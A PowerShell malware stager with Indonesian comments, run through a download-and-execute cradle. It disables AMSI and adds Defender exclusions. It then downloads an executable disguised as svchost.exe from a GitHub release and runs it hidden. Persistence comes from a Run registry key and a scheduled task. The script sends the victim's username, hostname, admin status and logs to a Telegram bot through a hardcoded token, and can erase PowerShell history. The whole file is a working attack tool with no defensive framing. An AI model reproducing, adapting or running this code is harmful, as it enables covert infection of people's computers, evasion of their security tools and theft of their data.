# st.ps1 v3 - stager + retry + bukti via Telegram
# Dipanggil cradle:  iex (WebClient).DownloadString('https://.../st.ps1')

$ErrorActionPreference = 'Continue'
$ProgressPreference    = 'SilentlyContinue'

# ---------------------------------------------------------------- CONFIG
$url     = 'https://github.com/byteforge0-cloud/darkwhisper/releases/download/mantap/svchost.exe'
$urlB64  = ''                       # opsional: URL .b64 (base64 exe) sbg cadangan
$exe     = Join-Path $env:TEMP ('svchost_{0}.exe' -f (Get-Random -Minimum 10000 -Maximum 99999))
$bot     = '9037027380:AAFrvv-oDxBH65pNbv0aNAflsjMAijyDMKo'
$chat    = '949121454'
$persist = $true
$cleanup = $false
$ua      = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
# ----------------------------------------------------------------------

$log  = Join-Path $env:TEMP 'st.txt'
$mark = Join-Path $env:TEMP 'st.marker'
function T($s) { "$((Get-Date -f HH:mm:ss))  $s" | Out-File -FilePath $log -Append -Encoding utf8 }

Remove-Item $log -Force -ErrorAction SilentlyContinue
T "mulai pid=$PID ps=$($PSVersionTable.PSVersion) x86=$([Environment]::Is64BitProcess)"
T "admin=$(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators'))"

# penjaga: jangan eksekusi ulang dalam 5 menit.
# Kalau dilewati, kirim keterangannya ke Telegram supaya tidak terlihat "gagal".
if ((Test-Path $mark) -and ((Get-Date) - (Get-Item $mark).LastWriteTime).TotalMinutes -lt 5) {
    T 'skip: sudah jalan kurang dari 5 menit'
    if ($bot -and $chat) {
        curl.exe -s -F "chat_id=$chat" -F "document=@$log" -F "caption=SKIP" "https://api.telegram.org/bot$bot/sendDocument" > $null
    }
    exit
}
New-Item $mark -ItemType File -Force | Out-Null

# ---------- 0. AMSI ------------------------------------------------------
try {
    $t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $t.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
    T 'amsi ok'
} catch { T 'amsi fail' }

# ---------- 1. exclusion ------------------------------------------------
$ok = 0
try { Add-MpPreference -ExclusionPath $exe -Force -ErrorAction Stop; $ok++ } catch { }
try { Add-MpPreference -ExclusionProcess 'svchost*.exe' -Force -ErrorAction Stop; $ok++ } catch { }
try { Add-MpPreference -ExclusionPath $env:TEMP -Force -ErrorAction Stop; $ok++ } catch { }
T "excl=$ok/3"

# ---------- 2. unduh: 3x coba, lalu base64 ------------------------------
Remove-Item $exe -Force -ErrorAction SilentlyContinue
for ($i = 1; $i -le 3; $i++) {
    curl.exe -sL --max-time 600 -A $ua -o $exe $url
    if ((Test-Path $exe) -and (Get-Item $exe).Length -gt 1MB) { T "curl ok try=$i"; break }
    T "curl gagal try=$i"
    Start-Sleep -Seconds 2
}

if (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 1MB) {
    try {
        $c = New-Object Net.WebClient
        $c.Headers['User-Agent'] = $ua
        $c.DownloadFile($url, $exe)
        T 'webclient ok'
    } catch { T "webclient fail: $($_.Exception.Message)" }
}

if ($urlB64 -and (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 1MB)) {
    try {
        $c = New-Object Net.WebClient
        $b = ($c.DownloadString($urlB64)) -replace '\s', ''
        [IO.File]::WriteAllBytes($exe, [Convert]::FromBase64String($b))
        T 'b64 ok'
    } catch { T "b64 fail: $($_.Exception.Message)" }
}

if (-not (Test-Path $exe)) { T 'ABORT tidak ada file'; }
elseif ((Get-Item $exe).Length -lt 1MB) { T "ABORT ukuran $((Get-Item $exe).Length)" }
else {
    T "ukuran $((Get-Item $exe).Length)"
    Unblock-File $exe -ErrorAction SilentlyContinue

    # ---------- 3. jalan ------------------------------------------------
    Start-Process -FilePath $exe -WindowStyle Hidden
    T 'started'

    # ---------- 3b. persistence --------------------------------------
    if ($persist) {
        $dst = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\svchost.exe'
        New-Item (Split-Path $dst) -ItemType Directory -Force | Out-Null
        Copy-Item $exe $dst -Force -ErrorAction SilentlyContinue
        try {
            New-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsHost' -Value ('"' + $dst + '"') -PropertyType String -Force | Out-Null
            T 'persist run ok'
        } catch { T 'persist run gagal' }
        if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators')) {
            schtasks.exe /create /tn 'WindowsHost' /tr ('"' + $dst + '"') /sc onlogon /rl highest /f *> $null
            T 'persist task dicoba'
        }
        T "persist dst=$dst"
    }

    # ---------- 4. bukti -----------------------------------------------
    if ($bot -and $chat) {
        $proof = Join-Path $env:TEMP ('p_{0}.txt' -f (Get-Random))
        @(
            "user : $env:USERNAME"
            "host : $env:COMPUTERNAME"
            "admin: $(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators'))"
            "time : $(Get-Date -f s)"
        ) | Out-File $proof -Encoding utf8
        $api = "https://api.telegram.org/bot$bot/sendDocument"
        curl.exe -s -F "chat_id=$chat" -F "document=@$proof" -F "caption=$env:COMPUTERNAME" $api > $null
        curl.exe -s -F "chat_id=$chat" -F "document=@$log" -F "caption=log" $api > $null
        if (Test-Path (Join-Path $env:TEMP 'b.txt')) {
            curl.exe -s -F "chat_id=$chat" -F "document=@$(Join-Path $env:TEMP 'b.txt')" -F "caption=av" $api > $null
        }
        Remove-Item $proof -Force -ErrorAction SilentlyContinue
    }
}

# ---------- 5. cleanup --------------------------------------------------
if ($cleanup) {
    Remove-MpPreference -ExclusionPath $exe -Force -ErrorAction SilentlyContinue
    Remove-MpPreference -ExclusionPath $env:TEMP -Force -ErrorAction SilentlyContinue
    Clear-History
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
    Remove-Item $log -Force -ErrorAction SilentlyContinue
    Remove-Item $mark -Force -ErrorAction SilentlyContinue
}
exit
